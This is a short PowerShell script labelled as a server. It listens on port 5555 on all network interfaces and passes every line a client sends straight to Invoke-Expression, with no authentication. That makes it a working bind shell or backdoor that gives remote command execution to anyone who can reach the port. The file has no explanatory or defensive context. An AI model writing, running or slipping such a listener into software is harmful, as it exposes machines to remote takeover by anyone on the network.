```PowerShell
#Server
$ip=[IPAddress]"0.0.0.0"
$TcpListener=New-Object System.Net.Sockets.TcpListener (New-Object System.Net.IPEndPoint($ip,"5555"))
$TcpListener.Start()

while($true)
{
$mensaje=(New-Object System.IO.StreamReader ($TcpListener.AcceptTcpClient().GetStream())).ReadLine()
$mensaje | iex
}
$TcpListener.Stop()
```
